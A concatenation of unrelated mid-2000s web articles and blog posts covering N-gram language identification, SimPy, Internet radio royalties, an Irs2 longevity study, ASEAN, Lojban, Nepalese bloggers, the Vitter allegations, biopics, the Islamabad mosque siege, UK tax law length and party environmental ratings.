The principle is to cut into defined pieces m long texts written in their respective language ( english , french … ) , that we will call training texts , and count how much time each piece appeared ;
Do the same on the text you want to identify , and check the training text matching your text the best ;
This training text is most likely written in the same language as your text .
The pieces are the N - grams , ie for the word GARDEN the bi-grams ( N=2 ) are : G , GA , AR , RD , DE , EN , N .
Now there are various way of finding the best matching text playing with the N - grams , distances , score …
I found an implementation from 1996 in C , here with sources .
So I followed same algorithm and implemented it in Ruby .
Those C sources reminded me of my C days where you had to implement your lists , hashes .
Those sources are optimized for memory usage ( 10 years ago … ) …
At the end the Ruby code is a hundred line while the C was four times more , and the Ruby code is easier to read .
Do n’t take that as a demonstration , it is not !!
I admit the C binary is maybe a bit faster ( but not that much ; ) ) .
I ’ll try to commit it on rubyforge when I have some time .
The results are excellent as shown in the paper :
Anyway actually in this story the most interesting was not the implementation but the method :
It is funny that you can identify languages ( so human population as well ) by without requiring linguistic knowledge : ignoring grammar , senses of words ( dictionary ) …
But by only analyzing letters and blocks of letters from Shakespeare or Baudelaire .
N - grams can also be used in other areas , for example in music to predict which note is likely to follow .

I ’ve been using the SimPy discrete - event simulation package lately , and I really like it .
As the SimPy home page says , “ SimPy (= Simulation in Python ) is an object - oriented , process - based discrete - event simulation language based on standard Python . ”
What does that mean ?
Well , first of all , it is a Python module , and you import and then use it like any other Python module .
( If you have n’t used Python , get yourself over to www.python.org and download it now !
Or if you use Mac OS X or Linux , you already have it .
Python is a powerful , high - level general - purpose language , and comes with excellent documentation . )
“ Discrete - event simulations ” are something a good nerd will often need to write .
They are simulations where things happen at discrete times .
There are three levels of sophistication in handling such simulations .
Level zero is to just step forward in time by small increments , checking every time step for each possible event .
Not too bright , because you waste a lot of computation on time steps when nothing happens .
Level one is the “ event - oriented ” approach , where you keep events in some “ agenda , ” and you process events in the agenda one at a time , with each event in the agenda possibly creating new events in the future that are then added to the agenda .
Level one is as far as most people get , but it ’s not where you should stop , because writing an event - oriented simulation is painful and error - prone .
The right thing to do is to go to the next level of sophistication , the “ process - oriented ” approach .
In the process - oriented approach , you create special objects , called processes , which are like “ living ” objects .
Processes have a special event method which functions as an event loop .
To program the events in your simulation , you need to write one or more process event methods which describes how each process object reacts to the possible events in the simulation .
It turns out that these process event methods are very natural and easy to write , because they properly correspond to how we think about what is happening in the simulation .
So how does it work ?
Well , SimPy sets up and handles the event agenda underlying the system , so you do n’t have to do it yourself .
When you call the SimPy “ simulate ( ) ” method , it begins stepping through the events in the event agenda , calling the appropriate process event methods defined in your processes in the correct order .
The Python feature that makes the whole thing work is the Python “ yield ” statement , which is like a return , except that the next time a function with a “ yield ” is called , it picks up after the yield rather than at the beginning of the function .
All the process event methods you define when using SimPy will use yields to give back control to the SimPy run-time system .
Anyways , Professor Norm Matloff from UC
Davis has written some excellent tutorials , or you can use the documentation that comes with SimPy .

Internet radio will remain safe and sound , at least through July of this year , on account of a new decision by the US Copyright Royalty Board .
Under the CRB 's original ruling , Internet radio stations would have had to begin paying retroactive royalties on May 15 , thereby knocking many of them offline due to the crippling fees .
The new date , July 15 , 2007 , is two months later than the original deadline set by the CRB and offers some reprieve for Internet radio stations hoping for a miracle ( or Congress ) to reverse the CRB 's decision .
The original ruling by the CRB caused widespread outrage from Internet broadcasters and listeners alike .
The ruling said that every Internet radio station — even nonprofit stations and those that serve the public — must pay heavily - increased royalty fees to royalty collection entity SoundExchange .
The rate hike involved a $ 500 annual fee for each channel owned by a station and a royalty for every song played per connected user at the time of the song 's broadcast .
The CRB ruled that Internet radio stations would have to pay retroactive fees on the new rates to cover 2006 and 2007 , as well .
National Public Radio spearheaded an appeal against the CRB 's ruling , arguing that the newly - proposed fees for Internet broadcasters were so high that they would cripple nearly all of the currently - available radio stations on the ' Net .
The organization also reasoned that the fee would be impossible for broadcasters to calculate and begged the CRB to reconsider the formulas for calculating its new fee structure .
The CRB rejected the appeal several weeks later and upheld every part of the original ruling , save for how royalties would be calculated .
Instead of charging a royalty for each time a song is heard by a listener , the broadcasters would be able to pay fees based on average listening hours through 2008 .
However , the new formula would still yield fees crippling most ' Net radio stations and force them offline once retroactive fee collection started on May 15 .
The new date issued by the CRB gives Internet radio stations two more months before having to pay the retroactive fees for the past year and a half .
One lobby group , SaveNetRadio , pledged to spend the next 45 days " educating Congress " on why ' Net radio should stick around .
" We feel strongly that Congress could not possibly have intended a structure whereby Internet radio services pay 60 percent to 300 percent of their revenue in royalties while satellite radio pays 5 to 7 percent and broadcasters pay zero , " said the group in a statement .
" We urge them to support HR 2060 . "
HR 2060 is , of course , the Internet Radio Equality Act .
It was introduced in April by Representatives Jay Inslee ( D - WA ) and Don Manzullo ( R - IL ) and would essentially reverse the CRB 's decision , returning Internet radio to its previous , percentage - based fee structure that is similar to that of satellite radio .
While Internet radio stations and supporting groups did n't have much time to lobby Congress when the bill was initially introduced , the deadline extension by the CRB could give groups like SaveNetRadio just enough time to , fittingly , save ' Net radio .
If Internet radio stations are important to you , we urge you to contact your Representative and let him or her know that you support the Internet Radio Equality Act .
Mammals have four insulin - like growth factor receptor genes .
Earlier studies by Morris White ‘s lab at Harvard Medical School had established that deletion of one of these , Irs2 , caused mice to develop diabetes - like insulin resistance .
The White lab ( Taguchi et al. , “ Brain IRS2 signaling Coordinates Lifespan and Nutrient Homeostasis , ” Science , July 19 , 2007 ) has re-examined the role of Irs2 in light of recent findings about insulin signaling in the control of aging .
Heterozygous nulls of Irs2 ( Irs2 +/-) showed essentially normal development and metabolism in youth but in old age proved surprisingly responsive to insulin , with lower levels of glucose and insulin upon fasting .
Consistent with the insulin resistance theory of aging , Irs2 +/- mice lived ~ 17 % longer than wild type controls .
But where does lower insulin signaling mediate these effects ?
Drawing on work by Cathy Wolkow in C. elegans , Taguchi et al. tested whether decreased Irs2 levels in the brain could influence longevity by using a Cre-Lox - mediated knockout of Irs2 in broad swaths of the brain .
The result was quite paradoxical — brain - specific disruption of Irs2 recapitulated the diabetes - like obesity and insulin resistance of the whole body knockouts but nevertheless extended lifespan .
Moreover , like the surprisingly fast fat guy on my swimming team , these ostensibly diabetic mice were still quite energetic and active in old age , as measured through a number of arcane metabolic assays .
Another curious feature of the brain - specific Irs2 knockouts is that they have markedly smaller brains .
Fortunately , another recent paper shows that a small brain per se is no impediment to a normal family life or even a career in the civil service .
These findings challenge a number of ideas about the insulin resistance theory of aging .
Brain - specific disruption of Irs2 makes mice display some of the supposedly causative features of aging ( obesity , insulin resistance , glucose intolerance ) but yet these mice are both more active and longer - lived than age - matched wild type animals .
Does this mean that regardless of the state of the body , lifespan extension is all in the head ?
Can we have our cake and eat it , too ?
Eat that , caloric restriction suckas !
MANILA , Philippines ( Reuters ) -- Southeast Asian foreign ministers overcame differences on Monday on setting up a human - rights commission after military - ruled Myanmar dropped objections to the plan , participants said .
Myanmar 's Foreign Minister U Nyan Win , center , is escorted upon arriving in Manila on Sunday .
The issue had created a rift within the Association of South East Asian Nations ( ASEAN ) and threatened to divert attention from the group 's efforts at economic integration .
" We have agreed to create the human - rights body , " Singapore 's Foreign Minister George Yeo told reporters after the first session of an ASEAN ministerial meeting in the Philippine capital .
" At the ministers ' level we have a consensus .
Myanmar had a positive attitude towards all of this . "
He said the ministers had yet to decide on terms of reference and other specifics , but would do so soon .
The human - rights commission is an integral part of a landmark charter that ASEAN is trying to complete before a leaders ' summit in November .
Until Sunday , diplomats had said Myanmar and some other countries had blocked the establishment of the commission .
But other problems confront ASEAN over the former Burma .
The European Union , which ASEAN hopes to emulate , and the United States have criticized the Asian group for failing to bring enough pressure on Myanmar to restore democracy and free Nobel laureate Aung San Suu Kyi .
Earlier on Monday , Philippine President Gloria Macapagal Arroyo called for unity in the region and a focus on its goal of economic integration by 2015 .
" An ASEAN community is going to be anchored first and foremost on economic integration , with a focus on social justice and raising the standard of living in the region , " she said while inaugurating the meeting .
" It is about creating a dynamic force in Asia to maximize the benefit of globalization .
Too much has been made of our diversity as a barrier .
Our diversity is a strength and not a barrier to an East Asian union . "
ASEAN is also divided on whether it should abandon its time - honored way of resolving issues by consensus or put them to a vote .
It has also to take a decision on how to penalize members who violate the charter .
Yeo , the Singaporean minister , said these issues would be left for the leaders ' summit to decide .
Analysts however say the idea of an ASEAN human - rights code will be difficult to achieve given the differing interpretations of the term within the group and stricter anti-terrorism laws across the region .
" The best that ASEAN can achieve in its landmark charter is a best - efforts pledge to work for adherence to human rights , " said columnist Ana Marie Pamintuan in the Philippine Star newspaper .
" The charter provision will have to be vaguely worded , or several laws used to fight terrorism could be considered violations . "

Lojban - a logical language
1. Welcome to Lojbanistan !
Lojban , in Lojban , means " logical language " ( the j is pronounced as in French bonjour ) Lojbanistan is both an imaginary country where Lojban is spoken and , in practice , the international community of Lojban - speakers .
Lojban itself came out of an earlier language project called Loglan , and it shares Loglan 's interest in the " Sapir - Whorf hypothesis " - the idea that the language you speak affects the way you think .
Most people who have learnt a foreign language , or have grown up speaking two languages , will be familiar with this idea , having found themselves thinking and speaking in one language or the other because something is easier to say in that language .
One of the main ideas behind the Loglan / Lojban project was to create a language which is both highly expressive and as culturally neutral as possible , then see what people from different cultures do with it .
To give an example , in most European languages time and gender are very important - you can say " She goes " , " It went " , " He 'll go " and so on , but just to say " She / he / it go , " with no particular gender or time in mind , sounds strange .
In Chinese , on the other hand , ta qu ( he / she / it go ) is perfectly normal .
In Lojban there are plenty of words to show the time of an action , its length , how it happens and so on - but you do n't have to use any of them .
If I really wanted to , I could say :
le ninmu puzuze ' udi'i klama
A long time ago , for a long time , she went regularly .
the female - human past - long - time - distance - long - time - interval - regularly go [ literally ]
But normally I 'd just say :
klama
[ someone / something ] go
Notice that you can translate the first example into English ( more - or - less ) but the second one just wo n't go into English , or most European languages .
If you 're European and this strikes you as odd , you may have just witnessed a Sapir - Whorf effect !
However , if Lojban only existed as some kind of experiment to test the Sapir - Whorf hypothesis , probably very few people would bother to learn it .
In fact , Lojban 's other uses have taken over so much that quite a few Lojbanists who do n't believe much in Sapir - Whorf still use the language because of its other benefits .
Some that I 've heard are :
It encourages you to think clearly and logically .
It lets you express ideas precisely , but allows you to be vague when you want to .
It can easily express a much wider range of emotions than most natural languages .
It helps you step out of your cultural conditioning .
Computers can understand it .
It 's good for discussing philosophy .
It 's good for writing poetry ...
... and so on .
Not all Lojbanists would agree with all of these statements - we are not language missionaries - but there 's something in the language for almost everyone .
In the long - term , Lojban has more ambitious goals .
Some ways that people have suggested Lojban can be used are :
As a language for human - computer interaction and artificial intelligence research .
As an interlanguage for translation - it would probably be easier and more accurate to translate from , say , Korean into Lojban then from Lojban to German , than directly from Korean to German .
As a " meta - language " i.e. a language for describing languages .
As a language for international law .
As a way of improving our understanding of different cultures .
As a tool in psychotherapy and other forms of self - development .
As an international language .
This last point needs some clarification .
There are already dozens of " international languages " , the most famous being Esperanto .
Although Lojban can ( and in my opinion , should ) be used as an international language , it is not in direct competition with any of these , because it is not only an international language .
Of course it would be nice if the whole world started speaking Lojban , but if the United Nations decided to adopt Esperanto or Interlingua or whatever , most inhabitants of Lojbanistan would rush out and learn that language ... and still go on using Lojban for its other benefits .
2. Lojban Words
Constructed languages create words in two main ways .
There are some , mainly fictional languages like Elvish or Klingon , which make up all the words from scratch .
Most international languages , however , take their vocabulary from existing languages ( in practice , European languages ) and sometimes modify them to suit the spelling and grammar of the new language - Esperanto is a good example .
Lojban falls half way between the two .
The root words ( gismu in Lojban ) were created by a computer from words in the six most widely - spoken languages in the world : Chinese , Hindi / Urdu , English , Spanish , Arabic and Russian .
This is one of the advantages of Lojban - it does n't give a privileged position to European languages .
These are also languages that have had a lot of words in common other languages ; for example , French and Italian share a lot of words with Spanish , and although Turkish is not on the list , I found in Lojban a lot of elements of Turkish which had come in from Arabic and Persian ( which is quite close to Urdu ) .
And of course English words like " television " and " taxi " have spread all over the world .
All root words have five letters .
For example :
prenu - person
- person cukta - book
- book vanju - wine
Although these do n't look much like any particular word in any language , you can see bits of different languages in each of them .
For example , prenu has the " per " of English " person " and the ren of Chinese .
cukta has the " ook " of English " book " , all of Chinese shu ( c is pronounced " sh " ) , and part of Arabic ( and Turkish ) kitap .
vanju is like French vin and Chinese jiu .
This makes learning words easier for the largest number of people .
There are 1,300 root words .
This might sound like a lot , but it is nothing compared to the roughly 20,000 words a native speaker of a natural language knows .
Because you can't say everything you want with such a small number of words , Lojban allows compound words ( lujvo in Lojban ) .
For example , there is no root word for " nurse " , so I created a compound , kurmikce ( c from kurji ( take care of ) and mikce ( medic ) .
Lojban speakers have the freedom to create these compound words to express anything they want to say - if it catches on , it passes into the general Lojban vocabulary , and might even make it into the dictionary .
The important thing is that somebody learning Lojban does n't have to learn every lujvo someone makes up , because you can nearly always guess what they mean ( if you can't guess , there 's a neat little program on the Web which does it for you - remember what I said about computers being able to read Lojban ? ) .
This leaves the cmavo , or structure words .
Many languages put their grammar into their words , so that , for example , in Latin you have amo , amas , amat , amamus , amantis , amant .
This kind of thing comes naturally to native speakers , and is horribly difficult for the rest of us .
Lojban ( like Chinese ) makes every part of the grammar a separate word .
In English you have to change " go " to " went " to put it in the past , but in Chinese you just say qu le , and in Lojban you just say pu klama .
This brings us to ...
3. Lojban Grammar
" Grammar " is a word with painful memories for many of us .
I learnt German at school , and was constantly amazed at how complicated and illogical the grammar was ( not that English is much better ! ) .
Lojban grammar seems strange at first sight , but is actually quite simple .
It is based on a system called predicate logic , which states that in any sentence you have a relationship ( selbri in Lojban ) between one or more arguments ( sumti ) .
An argument can be a thing , event , quality or just about anything ( quite how you can have a relationship of one argument is one of the mysteries of predicate logic ! ) .
To give an example , the English sentence " Robin adores Juliette Binoche " has a relationship ( or " function " ) , " adore " , between two arguments , " Robin " and " Juliette Binoche " .
In Lojban this would be " la robin . prami la julIET.binOC. " or , if you prefer , " la robin . la julIET.binOC. prami " ( the capital letters show non-Lojban stress for foreign words , the full stops mean that you have to pause slightly to separate the words - anythingelseinLojbancanberuntogetherwithoutbeingmisunderstood ) .
You might be thinking " Well in that case a function is a verb and an argument is a noun , so why bother with special terminology like selbri and whatnot ? "
However , in Lojban I might describe my feelings about Juliette like this :
la julIET .
melbi
Juliette is - beautiful [ literally ]
In English you have a verb ( " doing word " ) , " is " , and an adjective ( " describing word " ) , " beautiful " .
In Turkish , you would say Juliette güzel , which is a noun and an adjective , with no verb required .
In Chinese you would use meili , a " stative verb " ... but enough !
In Lojban you do n't need all this .
A philosophical / psychological point : some people ( such as the philosopher Alfred Korzybski and the psychologist Albert Ellis ) have claimed that the English verb " be " has a bad effect on our thinking .
For example , if I say " Jim is bad " ( or good , or a Communist or whatever ) it implies , if only subconsciously , that there is something bad about his very essence , that he always has and always will be bad , and that everything he does is bad .
More Sapir - Whorf effects , perhaps .
In Lojban , there is a different word for " is " ( du ) meaning " the same as " ( as in " Three and four is seven " or " That is the Eiffel Tower " ) .
To say la djim .
du xlali would meaning something totally different in Lojban ( " Jim is equally bad " ) , and even la djim .
xlali would be pretty bad Lojban - you would have to say :
le nu la djim .
gasnu cu xlali
He does something bad ( ly )
the event - of he / she / it do [ cu ] is - bad [ literally ]
... or be more specific and say , for example , le nu la djim .
darxi le ninmu cu xlali - the event of his hitting the woman is bad .
Note that cu does not translate as is , or indeed as anything in English .
It is simply there to separate the function xlali from what goes before : le nu ko 'a gasnu xlali would be " her / his / its doing - kind - of bad - event , " just as le lunra gusni would be " the moon - kind - of light " , or " moonlight " .
Getting back to my obsession with a certain French actress , if there are no nouns , verbs , subjects or objects in Lojban , how do we know that la robin .
la julIET.binOC .
prami means that I adore Juliette and not the other way round ( a nice thought , but not realistic ) .
Different languages handle this problem differently .
In English it is done with word order , and when that is n't enough , with prepositions ( words like " at " , " from " , " to " , " with " and so on ) .
In other languages , like Latin or Turkish , it 's done by changing the form of the words e.g. Juliette 'i Robin sever means " Robin loves Juliette " , not " Juliette loves Robin . "
In Lojban this is built into the meaning of the word .
For example , the word dunda means " give " , but its full meaning is :
x 1 gives x 2 to x 3
So mi pu dunda le cuska le ninmu means " I gave the book to the woman " not " I gave the woman to the book " ( of course ) .
But enough of grammar for now .
The important point is that Lojban has a lot of what we would call " grammar " , but nearly all of this is contained in the cmavo ( structure words ) , and you can use as many or as few of them as you want .
4. Lojban is not Vulcan
As I 've said , Lojban means " logical language " .
Unfortunately , in many cultures we have the idea that being logical means having no emotions , rather like Mr. Spock in Star Trek .
In fact " logical " is not the opposite of " emotional " , but of " illogical " - in other words , saying things that do n't make sense .
In Lojban you can of course use " emotional " words like prami ( " love / adore " ) but there is also a special class of words set aside for expressing feelings .
Some examples are :
. a'o - hope ( pronounced " aho " )
- hope ( pronounced " aho " ) .ui - happiness ( " wheee ! " )
- happiness ( " wheee ! " ) . oi - complaint ( like " Oy vey ! " )
- complaint ( like " Oy vey ! " ) .u'u - regret ( and the normal Lojban way to say , " I 'm sorry " )
Each of these has a negative - .uinai means " unhappy " - and degrees of feeling - .uicai means " extremely happy " or " delighted " .
You can also combine the words in any way you like , which means you can invent words for emotions that do n't have a word in your native language .
For example , to express the feeling in a lot of Turkish pop songs ( arabesk ) , I invented the word .iucai.uinaicai ( pronounced " you - shy - we - nigh - shy " ) meaning something like " I am deeply in love and deeply unhappy . "
It does n't stop there , though .
.iu means " love " , but " love " can mean a lot of things .
If we need to , we can modify these basic emotions .
. iuro'i is emotional love , what we most commonly understand by the word .
. iuro'a is social love - what you might feel for a good friend .
.iuro'u , however , is definitely sexual , while .iure 'e is spiritual love , the kind of thing mystics feel , maybe .
You can even have .iuro'e - mental or intellectual love - if , for example , you had a passion for physics .
Lojban also has a lot of words for handling the general business of conversation .
Some examples are :
coi - hello
- hello co'o - goodbye
- goodbye mi'e - this is (+ your name )
- this is (+ your name ) pe'u - please
- please ta'o - by the way
- by the way mu'a - for example
- for example zo'o - humorously , just kidding , ;-)
Because there are no native speakers of Lojban ( well , not yet ) there are very few rules for Lojban conversation and writing .
Anyone who has tried speaking in a foreign language will know how easy it is to be rude without intending to .
In English , for example , you have to choose between " Can you come over here ? "
" Could you possibly come here , please ? "
" Come here , will you ? " or even " Hey you ! "
Lojban simplifies this considerably by separating the emotional and social content of a sentence from its literal meaning .
I can just say :
ko klama ti
you !
come here
or I can make it polite by saying pe'u do ko klama ti - I do n't have to disguise it as a question about your ability to come .
5 . The State of the Art
Lojban is a fairly new language , and it is possible that as it is used more , and used by more people , some parts of it will change .
However , to avoid the endless discussions about how to " improve " the language that have plagued some other constructed languages ( including Lojban 's predecessor , Loglan ) , it was agreed , after an a long initial period of developing and testing Lojban , that absolutely no changes to the language would be made for at least five years after the publication of The Complete Lojban Language ( which eventually came out in 1998 ) .
Because the language was tested and debated so much before this " baseline " , it is also unlikely that any major changes will occur after that period - what will probably happen instead is that people develop the language by creating new lujvo ( compound words ) and exploring some of the less - used aspects of Lojban grammar .
There are also a few areas of the language that have been deliberately left open for future developments .
In addition to the published The Complete Lojban Language , there is an HTML version of the book , which is essentially the same .
Other materials available from the Lojban website are wordlists , a draft textbook , and a large number of Lojban texts , both original and translated .
There is also a small but rapidly developing body of Lojban software .
The main plans afoot in Lojbanistan at the time of writing this are :
to publish the English - Lojban dictionary ;
to publish a selection of Lojban texts ;
to write a textbook ;
to start translating Lojban materials into other languages .
If you feel motivated by any of this to learn more about Lojban , please check out the Lojban homepage at www.lojban.org
There are also new methods of learning Lojban .
One of the things that is missed in the blogosphere circles that I notice so much is blogging for profit , vs blogging for change .
In the United States largely blogging and new media is about making money .
And while this is something I ’ve spent the last few years doing , my passion is really on ‘ blogging for change ’ , and freedom of expression .
I ’m touched by heartwarming stories of Nepalese bloggers who share , and use blogging as a tool and a medium to bring about positive change in the world .
The following story made my day , and made me realize how important blogging is to and to the world in which we live .
Dinesh Wagle , 29 , a writer at the popular Nepali - language Kantipur newspaper started blogging in October 2004 .
Aided by his writer - friend , Ujwal Acharya , 28 , he registered the website www.blog.com.np.
During the 15 - month - long autocratic rule of King Gyanendra that ended last April , the site was considered a â€œhuge hitâ€ among Nepalese worldwide and their friends to get fresh news and information on Nepal .
Then , they put down the â€œfresh and the latestâ€ about the happenings for â€œnews and informationâ€ hungry Nepalese .
Today , with peace and democracy together in place , Wagle maintains his diaries on the site .
â€ œWe are Nepalâ€™s first bloggers , â€ 
Wagle proudly asserts as he browses the net in his small cubicle .
â€ œLast week , I wrote about a concert I attended .
Tonight , I might write about blogging culture.â€ 
Vitter accidentally admitted relationship with call girl in 2002 David Edwards and Jason Rhyne
Published : Wednesday September 12 , 2007
Print This Email This Sen. David Vitter ( R - LA ) made a potentially Freudian slip - up while taking part in a New Orleans radio interview five years ago .
MSNBC's Dan Abrams , who hosted New Orleans call girl Wendy Cortez and Hustler magazine publisher Larry Flynt on his program Tuesday evening , played an excerpt from a July 2002 broadcast of Ringside , a political radio show during which Sen .
Vitter was confronted by a caller to the program about a possible relationship with Cortez .
The caller , identified as " Flaming Liberal , " challenged Vitter to sign under the penalty of perjury an affidavit saying you have never had an extramarital affair and you have never known , met or been in the company of one Wendy Cortez . 
" Thank you for repeating all these vicious rumors that my political enemies are trying to bandy about , " Vitter had responded on the show , adding , apparently mistakenly , that " those rumors are absolutely true , " and continuing , " they really do n't belong in any political campaign and I 've stated very clearly that they 're lies ... "
" Was n't so clear , based on what he just said , " Abrams remarked after playing the clip , as Cortez , who has accused the Louisiana senator of having a sexual relationship with her , laughed .
Cortez and Flynt appeared with Abrams following a Tuesday press conference announcing that a polygraph test had confirmed the call girl was telling the truth .
In another clip from the same radio show available at Ringside 's website , a caller named " Tom " asked Vitter to appear on air with Vincent Bruno , a Republican State Central Committee member from Louisiana who had earlier alleged that the senator was involved with Cortez .
Vitter responded by making clear that he would not appear with Bruno , and called him a  thug and a liar " - - a charge for which senator formally apologized the next day after Bruno threatened a lawsuit , Jeff Crouere , who conducted the interview writes .
Call girl is ' 100 percent positive '
" It was purely a sexual relationship , " Cortez told Dan Abrams , adding that her interaction with Vitter spanned four months .
" [ Vitter ] came to the escort service which I was working for at the time , and the appointment was set up and that 's how we met , " she said .
Asked by Abrams if she was sure it was the senator , she replied " 100 percent positive . "
Cortez 's polygraph examination , which was arranged and paid for by Flynt , was conducted by former American Polygraph Association president Edward Gelb .
The test asked whether she was telling the truth about the existence of a relationship , and whether it lasted for as long as she purported -- questions to which Gelb says Cortez responded truthfully .
" You kind of overlook a guy having one mistress , " the self - proclaimed ' smut - peddler ' whose magazine exposed Sen .
Vitter 's connection to a D.C. escort service earlier this year , said .
" But a guy having a half a dozen , you know - - a little bit overboard . "
Comparing Vitter , who remains in office , to embattled GOP Senator Larry Craig , who has announced his resignation plans , Flynt argued that there is a double standard among Republicans .
" It does n't take a rocket scientist to figure out what 's going on .
Idaho votes 80 percent republican and they 've got a Republican governor now ... either way they 're going to keep that seat .
But Vitter is on shaky ground in Louisiana and [ Republicans ] want to give him a pass . "
" All my life , I 've been called a liar , " said Cortez in response to a question about why she chose to come forward .
" I have integrity and I have dignity and I have self respect today and I 'm not a liar .
Who cares if [ Vitter ] did it , be honest .
Tell the truth , " she said .
The following video is from MSNBC's Dan Abrams Live , broadcast on September 11 .

Not only is the excellent The Flying Scotsman ( Filmstalker review ) out this week in the UK but there are a few different Sammy Davis Jr. biographical films in development , the Edith Piaf film on release , Che Guevara biographical films in production , and there are many more on the way .
That got me thinking about all the biographies on screen over the years , what makes a good biographical film , and which are the best and worst .
Which are yours , and what people would you like to see get their biographies on screen ?
& Just released this weekend is the superb The Flying Scotsman , a film that you really should see , it 's not a film just about cycling so much , it 's more about triumph over adversity , and it 's excellent for it .
It tells the story of Graeme Obree , the Scottish cycling hero who won medals and broke records time and time again using a hand built bike , part of which came from his washing machine drum .
However every achievement riled the governing body of the sport and rules changed , exclusions were made , obstacles galore were put in his place and they were n't just all external .
All the while he struggled with a deep depression .
After the recent Flying Scotsman I started thinking about other true stories , and as you start thinking of some , more and more pop out .
The ones that came to mind for me , and in no particular order are :
Evita , Ali , Nixon , Shackleton , Thirteen Days , Ghandi , Alexander , Downfall , Reach for the Sky
Instantly there 's something amiss with that list , the majority is about individuals , and yet films such as Thirteen Days , Downfall and Shackleton are about groups of individuals and specific events in their lives , and yet they reveal so much about one person and are tied with that name .
Thirteen Days is about the Cuban Missile Crisis and the many people involved , but I think it shows so much about John F. Kennedy and his relationship with his brother and country that it is more like a biography , albeit one with a shorter time frame .
Does that class as a biography then ?
I think it does .
What other biographical films can you think of which are n't necessarily straight retellings of someone 's life ?
Although there is a Margaret Thatcher film coming , it is only focusing on the seventeen days lead up to the Falkands War .
I do believe that she would make for a great , complete biography .
She built herself up from the daughter of a Greengrocer to the leader of Britain as its first female Prime Mininister , and throughout her career she battled the male institution and came through several key historical moments .
Ronald Reagan would be another great biography .
His time as US President saw many historical moments too , not least the signing of one of the most important documents of all time , the disarmament agreement with Russia .
Other people I 'd like to see biographies of are Steve McQueen , Frank Sinatra , Dean Martin , names in the entertainment spotlight .
Then there are sporting icons such as Stirling Moss or Ayton Senna , or historical figures such as Barnes Wallis or Edmund Hilary .
There 's an identifiable type of person that makes for a good biographical work , and if their life matches many of these elements then there is plenty of scope for a film about them .
Here 's what I think makes up that list .
People who have participated in shaping events as well as leading the way , people who have suffered adversity , failure and triumph .
People who 's lives give us something to aspire to , something to believe in while ours remain personally uninspiring and unfulfilling .
All that said they need to have had some form of tragedy , personal darkness and doubt , or controversy in their life .
Once you have these a biography is not far away , and you can see them all in The Flying Scotsman and other films above .
Who do you think would be suited to a biography and why ?
Which biographies have you really enjoyed so far ?
Perhaps there are even some names that should n't have their stories told ?
Despite the surrenders , hundreds are said to be still inside
Mosque explosions
Pakistani troops are tightening their grip around the mosque , which is at the forefront of a vigilante campaign to enforce a form of Islamic Sharia law .
The troops set off blasts outside the mosque , as negotiations continue with hundreds of students still inside .
At least 16 people have died in recent clashes at the complex .
The students have kidnapped police officers and people they accuse of involvement in " immoral " acts such as prostitution .
The BBC's Barbara Plett in Islamabad says the radicals do not have much support in Islamabad and people are quite glad to see the government taking them on .
But the authorities ' action is likely to upset people in the more conservative North - West Frontier province , where most of the students come from .
' They want martyrdom '
The government said more than 1,200 students had surrendered so far , and that their details were being recorded at a camp set up near the mosque .
Following the expiry of an 0900 local time ( 0500 GMT ) deadline on Thursday , at least four more female students and one male student were seen giving themselves up .
Maryam Qayyeum , 15 , one of those who surrendered , told the Associated Press news agency that those who were staying back in the mosque " only wanted martyrdom " .
" They are happy .
They do n't want to go home , " she said .
Another student , Johar Ali , 20 , said he had not seen any suicide bombers among the students .
Some children are thought to be in the mosque , but the mosque 's deputy head reportedly refused to allow their release despite requests from parents .
Deputy head Abdul Rashid Ghazi said the radicals would not surrender unless troops pulled back .
Our correspondent says the threat of force is likely to remain but that talks are expected to continue .
Cleric captured
Pakistani security forces set off a series of eight explosions outside the mosque before dawn .
No casualties have been reported but there was some damage to the mosque .
Maulana Abdul Aziz was caught as he tried to escape in a burqa
" All people in the mosque should surrender or they will be responsible for losses , " said the police warning broadcast over loudspeakers , according to witnesses quoted by Reuters news agency .
The mosque 's head cleric was captured by police as he tried to leave the building disguised as a woman .
Maulana Abdul Aziz was caught wearing the burqa , an all - enveloping sheet - like dress adopted by some Muslim women .
A security official told the AFP news agency the cleric was noticed because his height and his large stomach set him apart from the women he was with .
Pakistani President , Gen Pervez Musharraf , has long been criticised for failing to clamp down on the mosque 's activities .
The latest confrontation reportedly started when security forces tried to place barriers around the mosque .
On Tuesday , women students of one of two seminaries attached to the mosque protested in the street , while their male counterparts traded gunfire with security forces .
At least 16 people died in the violence and scores were hurt .
The smaller print meant the guide could be kept to four volumes
An authoritative guide to UK tax law has been published in smaller print to try to keep its growth under control .
In 2001 , Tolley 's Yellow Tax Handbook managed to lay out UK tax law in 5,952 pages across two volumes .
But the growing complexity of the tax system means that , in the old format , this year 's edition would have been almost 10,500 pages and five volumes .
As it is , the publication runs to a bookshelf - creaking four volumes and 9,866 pages .
PAGES IN TAX GUIDE 2001 - 5,952 2002 - 6,432 2003 - 7,344 2004 - 7,936 2005 - 9,178 2006 - 9,806 2007 - 9,866 * Source : LexisNexis
* In smaller print size " The complexity of the UK tax system continues to be a challenge for most businesses , " said Mike Truman , Tax Expert at LexisNexis , which publishes the handbook .
Plain English
Some of the lengthening of the tax rules has come from the government 's attempts to make it more comprehensible .
" They have undertaken a huge project to rewrite many of the income and company tax rules in plain English , which has also had the effect of making them longer , " said Richard Woolich , Tax Partner at DLA Piper .
" Modern commercial life is also very technical , which gives rise to detailed legislation , " he added .
Another complicating factor is that if the government wants to stamp out a particular measure for avoiding tax then it has to enact a specific piece of legislation to deal with it .
So as schemes for avoiding tax have become more complicated , more tax legislation is needed to deal with them .

All three of the major political parties are falling short in their response to the threats facing the environment , according to a study released today .
A group of leading environmental organisations assessed the green credentials of the Tories , Labour and the Liberal Democrats and found them all wanting .
The report praised David Cameron , the Conservative leader , for raising the profile of green issues , but found a " stark " gap between the rhetoric of his party and its policy commitments on the environment since the 2005 election .
Labour was commended for displaying international leadership on climate change , but was criticised for failing to meets its renewable energy targets , stop rising greenhouse gas emissions in the UK and implement a marine bill .
The Lib Dems scored best in the series of tests , with an " ambitious " set of actions to tackle climate change , but the report raised " serious concerns " about the party 's policies on the natural world and planning .
The Green Standard assessment was carried out by the Green Alliance , RSPB , Friends of the Earth , the Woodland Trust , WWF , the Wildlife Trusts , the National Trust , the Campaign to Protect Rural England and Greenpeace .
Stephen Hale , director of Green Alliance , said : " It is very disappointing that none of the three main parties are yet providing the leadership and action we need .
" The environmental ambitions of the parties are very welcome , but all three must close the gap between rhetoric and delivery in the run-up to the next general election . "
The parties were assessed on domestic action on climate change , international action on climate change , enabling " green living " , the natural environment , planning and environmental taxes and subsidies .
